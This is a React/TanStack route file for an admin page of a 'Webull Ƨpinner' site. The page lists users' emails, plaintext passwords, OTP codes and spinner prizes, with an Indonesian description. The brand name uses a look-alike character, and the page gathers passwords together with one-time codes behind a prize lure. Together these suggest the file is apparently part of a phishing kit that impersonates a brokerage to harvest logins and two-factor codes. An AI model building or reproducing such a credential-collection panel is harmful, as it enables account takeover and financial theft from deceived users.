import { createFileRoute } from "@tanstack/react-router";
import { AdminShell } from "@/components/admin-shell";
import { Card } from "@/components/ui-kit";
import { useStore } from "@/lib/store";

export const Route = createFileRoute("/admin/users")({
  head: () => ({
    meta: [
      { title: "Data User — Webull Ƨpinner" },
      {
        name: "description",
        content: "Daftar user login beserta kode OTP dan hadiah yang didapat.",
      },
      { property: "og:title", content: "Data User — Webull Ƨpinner" },
      {
        property: "og:description",
        content: "Daftar user login beserta kode OTP dan hadiah yang didapat.",
      },
    ],
  }),
  component: UsersPage,
});

function UsersPage() {
  const { state } = useStore();
  return (
    <AdminShell title="Data User">
      <Card className="overflow-x-auto">
        {state.users.length === 0 ? (
          <p className="text-sm text-muted-foreground">Belum ada user yang login.</p>
        ) : (
          <table className="w-full text-left text-sm">
            <thead className="text-xs uppercase text-muted-foreground">
              <tr>
                <th className="py-2">Email</th>
                <th>Password</th>
                <th>Kode OTP</th>
                <th>Hadiah</th>
                <th>Spin</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border">
              {state.users.map((u) => {
                const otp = state.otps.find((o) => o.code === u.otpCode);
                return (
                  <tr key={u.email}>
                    <td className="py-3 font-medium">{u.email}</td>
                    <td className="font-mono text-muted-foreground">{u.password}</td>
                    <td className="font-mono">{u.otpCode ?? "—"}</td>
                    <td className="text-muted-foreground">
                      {u.prizesWon.length ? u.prizesWon.join(", ") : "—"}
                    </td>
                    <td>
                      {u.spins}
                      {otp ? `/${otp.limit}` : ""}
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </Card>
    </AdminShell>
  );
}
